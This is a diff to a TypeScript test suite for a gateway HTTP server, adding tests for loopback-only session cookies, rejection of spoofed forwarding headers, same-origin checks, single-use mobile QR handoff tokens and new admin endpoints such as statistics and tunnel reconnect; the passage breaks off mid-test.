@@ -12,6 +12,7 @@ const OPENAI_SESSION_ID_RE =
   /^agent:[^:]+:channel:openai:chat:dm:peer:[a-f0-9]{16}$/;
 const OPENAI_EXECUTION_SESSION_ID_RE =
   /^agent:[^:]+:channel:openai:chat:dm:peer:(?:[a-f0-9]{16}|exec-[a-f0-9]{24})$/;
+const DEFAULT_TEST_GATEWAY_API_TOKEN = 'gateway-token';
 
 const ORIGINAL_HOME = process.env.HOME;
 const ORIGINAL_HYBRIDCLAW_AUTH_SECRET = process.env.HYBRIDCLAW_AUTH_SECRET;
@@ -53,7 +54,6 @@ function makeTempDocsDir(options?: {
   fs.mkdirSync(referenceDir, { recursive: true });
   fs.mkdirSync(consoleDistDir, { recursive: true });
   fs.writeFileSync(path.join(docsDir, 'index.html'), '<h1>Docs</h1>', 'utf8');
-  fs.writeFileSync(path.join(docsDir, 'chat.html'), '<h1>Chat</h1>', 'utf8');
   fs.writeFileSync(
     path.join(docsDir, 'agents.html'),
     '<h1>Agents</h1>',
@@ -297,6 +297,7 @@ function makeRequest(params: {
   body?: unknown;
   headers?: Record<string, string>;
   remoteAddress?: string;
+  noAuth?: boolean;
 }) {
   const chunks =
     params.body === undefined
@@ -313,7 +314,12 @@ function makeRequest(params: {
   return Object.assign(Readable.from(chunks), {
     method: params.method || 'GET',
     url: params.url,
-    headers: params.headers || {},
+    headers: {
+      ...(params.noAuth
+        ? {}
+        : { authorization: `Bearer ${DEFAULT_TEST_GATEWAY_API_TOKEN}` }),
+      ...(params.headers || {}),
+    },
     socket: {
       remoteAddress: params.remoteAddress || '127.0.0.1',
     },
@@ -370,6 +376,35 @@ function makeResponse() {
   return response;
 }
 
+function getSetCookieHeader(res: ReturnType<typeof makeResponse>): string {
+  const value = res.getHeader('Set-Cookie');
+  if (Array.isArray(value)) return value.join('; ');
+  return String(value || '');
+}
+
+function getCookiePair(setCookie: string, cookieName: string): string {
+  return (
+    setCookie
+      .split(/,\s*|\s*;\s*/)
+      .find((segment) => segment.startsWith(`${cookieName}=`)) || ''
+  );
+}
+
+function issueLocalWebSessionCookie(
+  state: Awaited<ReturnType<typeof importFreshHealth>>,
+): string {
+  const req = makeRequest({
+    url: '/chat',
+    headers: { host: 'localhost:9090' },
+    noAuth: true,
+  });
+  const res = makeResponse();
+
+  state.handler(req as never, res as never);
+
+  return getCookiePair(getSetCookieHeader(res), 'hybridclaw_local_session');
+}
+
 async function settle(): Promise<void> {
   await new Promise((resolve) => setImmediate(resolve));
   await new Promise((resolve) => setImmediate(resolve));
@@ -392,6 +427,7 @@ async function importFreshHealth(options?: {
   dataDir?: string;
   webApiToken?: string;
   gatewayApiToken?: string;
+  healthHost?: string;
   authSecret?: string;
   hybridAiBaseUrl?: string;
   runningInsideContainer?: boolean;
@@ -453,7 +489,8 @@ async function importFreshHealth(options?: {
   const loggerError = vi.fn();
   const loggerInfo = vi.fn();
   const loggerWarn = vi.fn();
-  const getGatewayHistory = vi.fn(() => ({
+  const getGatewayHistory = vi.fn((sessionId: string) => ({
+    sessionId,
     sessionKey: null,
     mainSessionKey: null,
     branchFamilies: [],
@@ -494,11 +531,6 @@ async function importFreshHealth(options?: {
       createdCount: 2,
       deletedCount: 1,
     },
-  }));
-  const getGatewayAssistantPresentationForSession = vi.fn(() => ({
-    agentId: 'charly',
-    displayName: 'Charly',
-    imageUrl: '/api/agent-avatar?agentId=charly',
   }));
   const getGatewayBootstrapAutostartState = vi.fn(() => null);
   const ensureGatewayBootstrapAutostart = vi.fn(async () => {});
@@ -620,6 +652,16 @@ async function importFreshHealth(options?: {
   const getGatewayAdminOverview = vi.fn(async () => ({
     status: { status: 'ok', sessions: 2, version: '0.7.1', uptime: 60 },
     configPath: '/tmp/config.json',
+    tunnel: {
+      provider: 'ngrok',
+      publicUrl: 'https://public.example.test',
+      state: 'up' as const,
+      health: 'healthy' as const,
+      reconnectSupported: true,
+      lastError: null,
+      lastCheckedAt: '2026-04-29T10:00:00.000Z',
+      nextReconnectAt: null,
+    },
     recentSessions: [],
     usage: {
       daily: {
@@ -641,6 +683,59 @@ async function importFreshHealth(options?: {
       topModels: [],
     },
   }));
+  const reconnectTunnelStatus = {
+    provider: 'ngrok',
+    publicUrl: 'https://next-public.example.test',
+    state: 'up' as const,
+    health: 'healthy' as const,
+    reconnectSupported: true,
+    lastError: null,
+    lastCheckedAt: null,
+    nextReconnectAt: null,
+  };
+  const reconnectGatewayAdminTunnel = vi.fn(async () => reconnectTunnelStatus);
+  const getGatewayAdminStatistics = vi.fn(
+    (params?: { days?: number | string }) => {
+      const raw =
+        typeof params?.days === 'number'
+          ? params.days
+          : typeof params?.days === 'string'
+            ? Number.parseInt(params.days, 10)
+            : 30;
+      const rangeDays = Math.max(
+        1,
+        Math.min(90, Number.isFinite(raw) ? Math.floor(raw) : 30),
+      );
+      return {
+        rangeDays,
+        startDate: '2026-04-01',
+        endDate: '2026-04-30',
+        totals: {
+          newSessions: 1,
+          activeSessions: 2,
+          totalMessages: 5,
+          userMessages: 3,
+          assistantMessages: 2,
+          totalInputTokens: 0,
+          totalOutputTokens: 0,
+          totalTokens: 0,
+          totalCostUsd: 0,
+          callCount: 0,
+          totalToolCalls: 0,
+        },
+        trend: [],
+        channels: [
+          {
+            channelId: 'web',
+            sessionCount: 2,
+            userMessages: 3,
+            assistantMessages: 2,
+            totalMessages: 5,
+          },
+        ],
+      };
+    },
+  );
   const getGatewayAdminEmailMailbox = vi.fn(() => ({
     enabled: true,
     address: 'agent@example.com',
@@ -851,6 +946,7 @@ async function importFreshHealth(options?: {
         inputTokens: 10,
         outputTokens: 5,
         costUsd: 0.01,
+        monthlySpendUsd: 0.01,
         messageCount: 2,
         toolCalls: 1,
         recentSessionId: DEFAULT_WEB_SESSION_ID,
@@ -885,6 +981,9 @@ async function importFreshHealth(options?: {
         output: ['tool.result read ok 12ms'],
       },
     ],
+  }));
+  const getGatewayAgentList = vi.fn(() => ({
+    agents: [{ id: 'main', name: 'Main Agent' }],
   }));
   const getGatewayAdminModels = vi.fn(async () => ({
     defaultModel: 'gpt-5',
@@ -998,6 +1097,32 @@ async function importFreshHealth(options?: {
         id: params.revisionId,
         content: `# revision ${params.agentId}:${params.fileName}:${params.revisionId}\n`,
       },
+    }),
+  );
+  const getGatewayAdminTeamStructure = vi.fn(() => ({
+    revisions: [],
+  }));
+  const getGatewayAdminTeamStructureRevision = vi.fn((revisionId: number) => ({
+    revision: {
+      id: revisionId,
+      author: 'test',
+      updatedAt: new Date(0).toISOString(),
+      changeCount: 0,
+      diff: { added: [], removed: [], changed: [] },
+      snapshot: { version: 1, agents: [] },
+    },
+  }));
+  const restoreGatewayAdminTeamStructureRevision = vi.fn(
+    (revisionId: number) => ({
+      revision: {
+        id: revisionId,
+        author: 'test',
+        updatedAt: new Date(0).toISOString(),
+        changeCount: 0,
+        diff: { added: [], removed: [], changed: [] },
+        snapshot: { version: 1, agents: [] },
+      },
+      agents: [],
     }),
   );
   const getGatewayAdminSessions = vi.fn(() => []);
@@ -1198,6 +1323,23 @@ async function importFreshHealth(options?: {
     channelDisabled: {},
     skills: [],
   }));
+  const getGatewayAdminAgentScoreboard = vi.fn(() => ({
+    observed_skill_count: 2,
+    agents: [
+      {
+        agent_id: 'charly',
+        display_name: 'Charly',
+        total_executions: 3,
+        success_rate: 1,
+        avg_score: 90,
+        avg_quality_score: 95,
+        avg_reliability_score: 88,
+        avg_timing_score: 70,
+        best_skills: [],
+        last_observed_at: '2026-04-27T10:00:00.000Z',
+      },
+    ],
+  }));
   const createGatewayAdminSkill = vi.fn(() => ({
     extraDirs: [],
     disabled: [],
@@ -1392,8 +1534,9 @@ async function importFreshHealth(options?: {
   vi.doMock('../src/config/config.ts', () => ({
     CONTAINER_SANDBOX_MODE: 'container',
     DATA_DIR: dataDir,
-    GATEWAY_API_TOKEN: options?.gatewayApiToken || '',
-    HEALTH_HOST: '127.0.0.1',
+    GATEWAY_API_TOKEN:
+      options?.gatewayApiToken ?? DEFAULT_TEST_GATEWAY_API_TOKEN,
+    HEALTH_HOST: options?.healthHost || '127.0.0.1',
     HEALTH_PORT: 9090,
     HYBRIDAI_BASE_URL: options?.hybridAiBaseUrl || 'https://hybridai.one',
     HYBRIDAI_MODEL: 'gpt-5',
@@ -1469,6 +1612,7 @@ async function importFreshHealth(options?: {
     deleteGatewayAdminSession,
     ensureGatewayBootstrapAutostart,
     GatewayRequestError,
+    getGatewayAgentList,
     getGatewayAgents,
     getGatewayAdminAgents,
     getGatewayAdminAgentMarkdownFile,
@@ -1477,6 +1621,8 @@ async function importFreshHealth(options?: {
     getGatewayAdminAudit,
     getGatewayAdminChannels,
     getGatewayAdminConfig,
+    getGatewayAdminTeamStructure,
+    getGatewayAdminTeamStructureRevision,
     applyGatewayAdminPolicyPreset,
     deleteGatewayAdminPolicyRule,
     deleteGatewayAdminEmailMessage,
@@ -1488,21 +1634,24 @@ async function importFreshHealth(options?: {
     getGatewayAdminModels,
     getGatewayAdminOverview,
     getGatewayAdminSessions,
+    getGatewayAdminAgentScoreboard,
     getGatewayAdminSkills,
+    getGatewayAdminStatistics,
     getGatewayAdminTools,
-    getGatewayAssistantPresentationForSession,
     getGatewayBootstrapAutostartState,
     getGatewayHistory,
     getGatewayRecentChatSessions,
     getGatewayHistorySummary,
     getGatewayStatus,
     handleGatewayCommand,
+    reconnectGatewayAdminTunnel,
     readSystemPromptMessage,
     renderGatewayCommand,
     resolveGatewayChatbotId,
     removeGatewayAdminChannel,
     removeGatewayAdminMcpServer,
     restoreGatewayAdminAgentMarkdownRevision,
+    restoreGatewayAdminTeamStructureRevision,
     saveGatewayAdminConfig,
     saveGatewayAdminAgentMarkdownFile,
     saveGatewayAdminPolicyDefault,
@@ -1586,13 +1735,16 @@ async function importFreshHealth(options?: {
     listenArgs,
     getGatewayStatus,
     ensureGatewayBootstrapAutostart,
-    getGatewayAssistantPresentationForSession,
+    getGatewayAgentList,
     getGatewayBootstrapAutostartState,
     getGatewayHistory,
     getGatewayRecentChatSessions,
     getGatewayHistorySummary,
     forkSessionBranch,
     getGatewayAdminOverview,
+    getGatewayAdminStatistics,
+    reconnectTunnelStatus,
+    reconnectGatewayAdminTunnel,
     deleteGatewayAdminEmailMessage,
     getGatewayAdminEmailFolder,
     getGatewayAdminEmailMailbox,
@@ -1601,6 +1753,8 @@ async function importFreshHealth(options?: {
     getGatewayAdminAgents,
     getGatewayAdminAgentMarkdownFile,
     getGatewayAdminAgentMarkdownRevision,
+    getGatewayAdminTeamStructure,
+    getGatewayAdminTeamStructureRevision,
     getGatewayAdminApprovals,
     saveGatewayAdminPolicyDefault,
     applyGatewayAdminPolicyPreset,
@@ -1613,6 +1767,7 @@ async function importFreshHealth(options?: {
     getGatewayAdminMcp,
     getGatewayAdminAudit,
     getGatewayAdminSkills,
+    getGatewayAdminAgentScoreboard,
     getGatewayAdminJobsContext,
     getGatewayAdminTools,
     startTerminalSession,
@@ -1627,6 +1782,7 @@ async function importFreshHealth(options?: {
     createGatewayAdminAgent,
     createGatewayAdminSkill,
     restoreGatewayAdminAgentMarkdownRevision,
+    restoreGatewayAdminTeamStructureRevision,
     updateGatewayAdminAgent,
     saveGatewayAdminAgentMarkdownFile,
     deleteGatewayAdminAgent,
@@ -1713,6 +1869,9 @@ describe('gateway HTTP server', () => {
     await vi.waitFor(() => expect(res.statusCode).toBe(200));
 
     expect(state.listenArgs).toEqual({ host: '127.0.0.1', port: 9090 });
+    expect(state.getGatewayStatus).toHaveBeenCalledWith({
+      refreshProviderHealth: false,
+    });
     expect(JSON.parse(res.body)).toEqual({ status: 'ok', sessions: 2 });
   });
 
@@ -1746,11 +1905,74 @@ describe('gateway HTTP server', () => {
     expect(res.body).toBe('voice-webhook');
   });
 
-  test('rejects unauthorized API requests from non-loopback addresses', async () => {
+  test('issues a local web-session cookie for loopback console pages when WEB_API_TOKEN is unset', async () => {
+    const state = await importFreshHealth();
+    const req = makeRequest({
+      url: '/chat',
+      headers: { host: 'localhost:9090' },
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+
+    expect(res.statusCode).toBe(200);
+    expect(getSetCookieHeader(res)).toContain('hybridclaw_local_session=');
+    expect(getSetCookieHeader(res)).toContain('HttpOnly');
+    expect(getSetCookieHeader(res)).toContain('SameSite=Strict');
+  });
+
+  test('does not issue a local web-session cookie for non-loopback request hosts', async () => {
+    const state = await importFreshHealth();
+    const req = makeRequest({
+      url: '/chat',
+      headers: { host: 'example.com' },
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+
+    expect(res.statusCode).toBe(200);
+    expect(getSetCookieHeader(res)).toBe('');
+  });
+
+  test('does not issue a local web-session cookie with forwarding headers', async () => {
+    const state = await importFreshHealth();
+    const req = makeRequest({
+      url: '/chat',
+      headers: { host: 'localhost:9090', 'x-forwarded-for': '203.0.113.10' },
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+
+    expect(res.statusCode).toBe(200);
+    expect(getSetCookieHeader(res)).toBe('');
+  });
+
+  test('rejects unauthenticated console pages when the gateway bind host is not loopback', async () => {
+    const state = await importFreshHealth({ healthHost: '0.0.0.0' });
+    const req = makeRequest({
+      url: '/chat',
+      headers: { host: 'localhost:9090' },
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+
+    expect(res.statusCode).toBe(401);
+    expect(res.body).toContain('Configure WEB_API_TOKEN');
+    expect(getSetCookieHeader(res)).toBe('');
+  });
+
+  test('rejects API requests from loopback without bearer auth or local web-session cookie', async () => {
     const state = await importFreshHealth();
     const req = makeRequest({
       url: '/api/status',
-      remoteAddress: '203.0.113.10',
+      noAuth: true,
     });
     const res = makeResponse();
 
@@ -1763,11 +1985,153 @@ describe('gateway HTTP server', () => {
     });
   });
 
+  test('allows API requests with a local web-session cookie when WEB_API_TOKEN is unset', async () => {
+    const state = await importFreshHealth();
+    const cookie = issueLocalWebSessionCookie(state);
+    const req = makeRequest({
+      url: '/api/status',
+      headers: { cookie, host: 'localhost:9090' },
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await waitForResponse(res, (next) => next.writableEnded);
+
+    expect(res.statusCode).toBe(200);
+    expect(JSON.parse(res.body)).toEqual(
+      expect.objectContaining({ status: 'ok' }),
+    );
+  });
+
+  test('rejects local web-session API auth with forwarding headers', async () => {
+    const state = await importFreshHealth();
+    const cookie = issueLocalWebSessionCookie(state);
+    const req = makeRequest({
+      url: '/api/status',
+      headers: {
+        cookie,
+        host: 'localhost:9090',
+        'x-forwarded-for': '203.0.113.10',
+      },
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await waitForResponse(res, (next) => next.writableEnded);
+
+    expect(res.statusCode).toBe(401);
+    expect(JSON.parse(res.body)).toEqual({
+      error: 'Unauthorized. Set `Authorization: Bearer <WEB_API_TOKEN>`.',
+    });
+  });
+
+  test('rejects unsafe local web-session API requests without same-origin headers', async () => {
+    const state = await importFreshHealth();
+    const cookie = issueLocalWebSessionCookie(state);
+    const req = makeRequest({
+      method: 'POST',
+      url: '/api/admin/config/reload',
+      headers: { cookie, host: 'localhost:9090' },
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await waitForResponse(res, (next) => next.writableEnded);
+
+    expect(res.statusCode).toBe(401);
+    expect(JSON.parse(res.body)).toEqual({
+      error: 'Unauthorized. Set `Authorization: Bearer <WEB_API_TOKEN>`.',
+    });
+  });
+
+  test('allows unsafe local web-session API requests with a matching origin', async () => {
+    const state = await importFreshHealth();
+    const cookie = issueLocalWebSessionCookie(state);
+    const req = makeRequest({
+      method: 'POST',
+      url: '/api/admin/config/reload',
+      headers: {
+        cookie,
+        host: 'localhost:9090',
+        origin: 'http://localhost:9090',
+      },
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await waitForResponse(res, (next) => next.writableEnded);
+
+    expect(res.statusCode).toBe(200);
+    expect(state.reloadRuntimeConfig).toHaveBeenCalledWith('admin-api');
+  });
+
+  test('requires API auth from loopback when WEB_API_TOKEN is configured', async () => {
+    const state = await importFreshHealth({ webApiToken: 'web-token' });
+    const req = makeRequest({
+      url: '/api/status',
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await waitForResponse(res, (next) => next.writableEnded);
+
+    expect(res.statusCode).toBe(401);
+    expect(JSON.parse(res.body)).toEqual({
+      error: 'Unauthorized. Set `Authorization: Bearer <WEB_API_TOKEN>`.',
+    });
+  });
+
+  test('rejects forwarded loopback headers from unauthenticated external sockets', async () => {
+    const state = await importFreshHealth();
+    const req = makeRequest({
+      url: '/api/status',
+      headers: { 'x-forwarded-for': '127.0.0.1' },
+      remoteAddress: '203.0.113.10',
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await waitForResponse(res, (next) => next.writableEnded);
+
+    expect(res.statusCode).toBe(401);
+    expect(JSON.parse(res.body)).toEqual({
+      error: 'Unauthorized. Set `Authorization: Bearer <WEB_API_TOKEN>`.',
+    });
+  });
+
+  test('allows an empty bearer token with a local web-session cookie when WEB_API_TOKEN is unset', async () => {
+    const state = await importFreshHealth();
+    const cookie = issueLocalWebSessionCookie(state);
+    const req = makeRequest({
+      url: '/api/status',
+      headers: { authorization: 'Bearer ', cookie, host: 'localhost:9090' },
+      noAuth: true,
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await waitForResponse(res, (next) => next.writableEnded);
+
+    expect(res.statusCode).toBe(200);
+    expect(JSON.parse(res.body)).toEqual(
+      expect.objectContaining({
+        status: 'ok',
+      }),
+    );
+  });
+
   test('rejects unauthorized OpenAI-compatible API requests from non-loopback addresses', async () => {
     const state = await importFreshHealth();
     const req = makeRequest({
       url: '/v1/models',
       remoteAddress: '203.0.113.10',
+      noAuth: true,
     });
     const res = makeResponse();
 
@@ -3415,11 +3779,6 @@ describe('gateway HTTP server', () => {
       sessionId: 's1',
       sessionKey: undefined,
       mainSessionKey: undefined,
-      assistantPresentation: {
-        agentId: 'charly',
-        displayName: 'Charly',
-        imageUrl: '/api/agent-avatar?agentId=charly',
-      },
       bootstrapAutostart: null,
       history: [
         { role: 'user', content: 'hello' },
@@ -3556,6 +3915,7 @@ describe('gateway HTTP server', () => {
     const req = makeRequest({
       url: '/api/agent-avatar?agentId=charly&token=web-token',
       remoteAddress: '203.0.113.10',
+      noAuth: true,
     });
     const res = makeResponse();
 
@@ -3751,6 +4111,7 @@ describe('gateway HTTP server', () => {
       userId: 'web-user-a',
       channelId: 'web',
       limit: 10,
+      fallbackToChannelRecent: true,
     });
     expect(res.statusCode).toBe(200);
     expect(JSON.parse(res.body)).toEqual({
@@ -3883,8 +4244,131 @@ describe('gateway HTTP server', () => {
       channelId: 'web',
       limit: 25,
       query: 'deploy',
+      fallbackToChannelRecent: true,
     });
     expect(res.statusCode).toBe(200);
+  });
+
+  test('requires API auth for mobile chat QR handoff creation', async () => {
+    const state = await importFreshHealth({ webApiToken: 'web-token' });
+    const req = makeRequest({
+      method: 'POST',
+      url: '/api/chat/mobile-qr',
+      remoteAddress: '203.0.113.10',
+      noAuth: true,
+      body: {
+        userId: 'web-user-a',
+        sessionId: 'agent:main:channel:web:chat:dm:peer:1234567890abcdef',
+      },
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await waitForResponse(res, (next) => next.writableEnded);
+
+    expect(res.statusCode).toBe(401);
+    expect(JSON.parse(res.body)).toEqual({
+      error: 'Unauthorized. Set `Authorization: Bearer <WEB_API_TOKEN>`.',
+    });
+  });
+
+  test('creates and redeems mobile chat QR handoffs once', async () => {
+    const state = await importFreshHealth({ webApiToken: 'web-token' });
+    const sessionId = 'agent:main:channel:web:chat:dm:peer:1234567890abcdef';
+    const createReq = makeRequest({
+      method: 'POST',
+      url: '/api/chat/mobile-qr',
+      headers: {
+        authorization: 'Bearer web-token',
+      },
+      body: {
+        userId: 'web-user-a',
+        sessionId,
+        baseUrl: 'https://example.test/chat',
+      },
+    });
+    const createRes = makeResponse();
+
+    state.handler(createReq as never, createRes as never);
+    await waitForResponse(createRes, (next) => next.writableEnded);
+
+    expect(createRes.statusCode).toBe(200);
+    const payload = JSON.parse(createRes.body) as {
+      launchUrl: string;
+      expiresAt: string;
+      qrSvg: string;
+    };
+    expect(payload.launchUrl).toMatch(
+      /^https:\/\/example\.test\/chat\/continue\?token=/,
+    );
+    expect(payload.expiresAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
+    expect(payload.qrSvg).toContain('<svg');
+
+    const continueUrl = new URL(payload.launchUrl);
+    const continueReq = makeRequest({
+      url: `${continueUrl.pathname}${continueUrl.search}`,
+    });
+    const continueRes = makeResponse();
+
+    state.handler(continueReq as never, continueRes as never);
+    await waitForResponse(continueRes, (next) => next.writableEnded);
+
+    expect(continueRes.statusCode).toBe(200);
+    expect(continueRes.body).toContain(
+      `localStorage.setItem('hybridclaw_user_id',"web-user-a");`,
+    );
+    expect(continueRes.body).toContain(
+      `localStorage.setItem('hybridclaw_session',"${sessionId}");`,
+    );
+    expect(continueRes.body).toContain(
+      `window.location.replace("/chat/${encodeURIComponent(sessionId)}");`,
+    );
+
+    const replayRes = makeResponse();
+    state.handler(continueReq as never, replayRes as never);
+    await waitForResponse(replayRes, (next) => next.writableEnded);
+
+    expect(replayRes.statusCode).toBe(401);
+    expect(replayRes.body).toBe('Mobile launch QR code is invalid or expired.');
+  });
+
+  test('rejects expired mobile chat QR handoff tokens', async () => {
+    const dateNow = vi.spyOn(Date, 'now');
+    dateNow.mockReturnValue(new Date('2026-04-26T12:00:00.000Z').getTime());
+    try {
+      const state = await importFreshHealth();
+      const createReq = makeRequest({
+        method: 'POST',
+        url: '/api/chat/mobile-qr',
+        body: {
+          userId: 'web-user-a',
+          sessionId: 'agent:main:channel:web:chat:dm:peer:1234567890abcdef',
+          baseUrl: 'https://example.test',
+        },
+      });
+      const createRes = makeResponse();
+
+      state.handler(createReq as never, createRes as never);
+      await waitForResponse(createRes, (next) => next.writableEnded);
+
+      const payload = JSON.parse(createRes.body) as { launchUrl: string };
+      dateNow.mockReturnValue(new Date('2026-04-26T12:10:00.001Z').getTime());
+
+      const continueUrl = new URL(payload.launchUrl);
+      const continueReq = makeRequest({
+        url: `${continueUrl.pathname}${continueUrl.search}`,
+      });
+      const continueRes = makeResponse();
+      state.handler(continueReq as never, continueRes as never);
+      await waitForResponse(continueRes, (next) => next.writableEnded);
+
+      expect(continueRes.statusCode).toBe(401);
+      expect(continueRes.body).toBe(
+        'Mobile launch QR code is invalid or expired.',
+      );
+    } finally {
+      dateNow.mockRestore();
+    }
   });
 
   test('rejects history requests without an explicit session id', async () => {
@@ -3952,6 +4436,76 @@ describe('gateway HTTP server', () => {
     });
   });
 
+  test('reconnects the admin tunnel for authorized API requests', async () => {
+    const state = await importFreshHealth();
+    const req = makeRequest({
+      url: '/api/admin/tunnel/reconnect',
+      method: 'POST',
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await settle();
+
+    expect(state.reconnectGatewayAdminTunnel).toHaveBeenCalledTimes(1);
+    expect(res.statusCode).toBe(200);
+    expect(JSON.parse(res.body)).toEqual({
+      tunnel: state.reconnectTunnelStatus,
+    });
+  });
+
+  test('returns admin statistics with default range when days is omitted', async () => {
+    const state = await importFreshHealth();
+    const req = makeRequest({ url: '/api/admin/statistics' });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await settle();
+
+    expect(state.getGatewayAdminStatistics).toHaveBeenCalledTimes(1);
+    expect(state.getGatewayAdminStatistics).toHaveBeenCalledWith({
+      days: undefined,
+    });
+    expect(res.statusCode).toBe(200);
+    expect(JSON.parse(res.body)).toMatchObject({
+      rangeDays: 30,
+      startDate: '2026-04-01',
+      endDate: '2026-04-30',
+      totals: { totalMessages: 5 },
+      channels: [{ channelId: 'web', sessionCount: 2 }],
+    });
+  });
+
+  test('forwards days query param to admin statistics service', async () => {
+    const state = await importFreshHealth();
+    const req = makeRequest({ url: '/api/admin/statistics?days=7' });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await settle();
+
+    expect(state.getGatewayAdminStatistics).toHaveBeenCalledWith({
+      days: '7',
+    });
+    expect(res.statusCode).toBe(200);
+    expect(JSON.parse(res.body).rangeDays).toBe(7);
+  });
+
+  test('clamps oversized days query param via the statistics service', async () => {
+    const state = await importFreshHealth();
+    const req = makeRequest({ url: '/api/admin/statistics?days=9999' });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await settle();
+
+    expect(state.getGatewayAdminStatistics).toHaveBeenCalledWith({
+      days: '9999',
+    });
+    expect(res.statusCode).toBe(200);
+    expect(JSON.parse(res.body).rangeDays).toBe(90);
+  });
+
   test('returns live admin email mailbox metadata for authorized API requests', async () => {
     const state = await importFreshHealth();
     const req = makeRequest({ url: '/api/admin/email' });
@@ -3974,6 +4528,7 @@ describe('gateway HTTP server', () => {
     const req = makeRequest({
       url: '/api/admin/email',
       remoteAddress: '203.0.113.10',
+      noAuth: true,
     });
     const res = makeResponse();
 
@@ -4246,6 +4801,10 @@ describe('gateway HTTP server', () => {
       skills: ['draft-outline', 'copy-edit'],
       chatbotId: undefined,
       enableRag: undefined,
+      role: undefined,
+      reportsTo: undefined,
+      delegatesTo: undefined,
+      peers: undefined,
       workspace: undefined,
     });
     expect(res.statusCode).toBe(200);
@@ -4327,6 +4886,10 @@ describe('gateway HTTP server', () => {
       skills: null,
       chatbotId: undefined,
       enableRag: undefined,
+      role: undefined,
+      reportsTo: undefined,
+      delegatesTo: undefined,
+      peers: undefined,
       workspace: undefined,
     });
     expect(res.statusCode).toBe(200);
@@ -4493,6 +5056,25 @@ describe('gateway HTTP server', () => {
     expect(res.statusCode).toBe(404);
     expect(JSON.parse(res.body)).toEqual({
       error: 'Revision "missing-rev" was not found.',
+    });
+  });
+
+  test('returns 404 for known admin team structure revision not-found errors', async () => {
+    const state = await importFreshHealth();
+    state.getGatewayAdminTeamStructureRevision.mockImplementationOnce(() => {
+      throw new Error('Team structure revision 999 was not found.');
+    });
+    const req = makeRequest({
+      url: '/api/admin/team-structure/revisions/999',
+    });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await settle();
+
+    expect(res.statusCode).toBe(404);
+    expect(JSON.parse(res.body)).toEqual({
+      error: 'Team structure revision 999 was not found.',
     });
   });
 
@@ -4704,6 +5286,7 @@ describe('gateway HTTP server', () => {
         {
           id: 'main',
           sessionCount: 1,
+          monthlySpendUsd: 0.01,
           status: 'active',
         },
       ],
@@ -4714,6 +5297,22 @@ describe('gateway HTTP server', () => {
           fullAutoEnabled: true,
         },
       ],
+    });
+  });
+
+  test('returns lightweight agent list for authorized API requests', async () => {
+    const state = await importFreshHealth();
+    const req = makeRequest({ url: '/api/agents/list' });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await settle();
+
+    expect(state.getGatewayAgentList).toHaveBeenCalledTimes(1);
+    expect(state.getGatewayAgents).not.toHaveBeenCalled();
+    expect(res.statusCode).toBe(200);
+    expect(JSON.parse(res.body)).toEqual({
+      agents: [{ id: 'main', name: 'Main Agent' }],
     });
   });
 
@@ -4729,6 +5328,35 @@ describe('gateway HTTP server', () => {
     expect(res.statusCode).toBe(200);
     expect(JSON.parse(res.body)).toMatchObject({
       defaultModel: 'gpt-5',
+    });
+  });
+
+  test('returns admin agent scoreboard for authorized API requests', async () => {
+    const state = await importFreshHealth();
+    const req = makeRequest({ url: '/api/admin/agent-scoreboard' });
+    const res = makeResponse();
+
+    state.handler(req as never, res as never);
+    await settle();
+
+    expect(state.getGatewayAdminAgentScoreboard).toHaveBeenCalledTimes(1);
+    expect(res.statusCode).toBe(200);
+    expect(JSON.parse(res.body)).toEqual({
+      observed_skill_count: 2,
+      agents: [
+        {
+          agent_id: 'charly',
+          display_name: 'Charly',
+          total_executions: 3,
+          success_rate: 1,
+          avg_score: 90,
+          avg_quality_score: 95,
+          avg_reliability_score: 88,
+          avg_timing_score: 70,
+          best_skills: [],
+          last_observed_at: '2026-04-27T10:00:00.000Z',
+        },
+      ],
     });
   });
 
@@ -4862,7 +5490,7 @@ describe('gateway HTTP server', () => {
   });
 
   test('rejects terminal websocket upgrades without session auth or direct request auth', async () => {
-    const state = await importFreshHealth();
+    const state = await importFreshHealth({ gatewayApiToken: '' });
     const socket = {
       write: vi.fn(),
       destroy: vi.fn(),
@@ -4873,6 +5501,7 @@ describe('gateway HTTP server', () => {
         method: 'GET',
         url: '/api/admin/terminal/stream?sessionId=terminal-session-1',
         remoteAddress: '10.0.0.5',
+        noAuth: true,
       }) as never,
       socket as never,
       Buffer.alloc(0) as never,
@@ -4884,7 +5513,72 @@ describe('gateway HTTP server', () => {
     );
   });
 
-  test('allows loopback terminal websocket upgrades to attach immediately', async () => {
+  test('allows terminal websocket upgrades with local web-session cookie and matching origin', async () => {
+    const state = await importFreshHealth();
+    const cookie = issueLocalWebSessionCookie(state);
+    const socket = {
+      write: vi.fn(),
+      destroy: vi.fn(),
+    };
+
+    state.upgradeHandler?.(
+      makeRequest({
+        method: 'GET',
+        url: '/api/admin/terminal/stream?sessionId=terminal-session-1',
+        headers: {
+          cookie,
+          host: 'localhost:9090',
+          origin: 'http://localhost:9090',
+        },
+        noAuth: true,
+      }) as never,
+      socket as never,
+      Buffer.alloc(0) as never,
+    );
+
+    expect(state.handleTerminalUpgrade).toHaveBeenCalledWith(
+      expect.anything(),
+      socket,
+      expect.any(Buffer),
+      expect.any(URL),
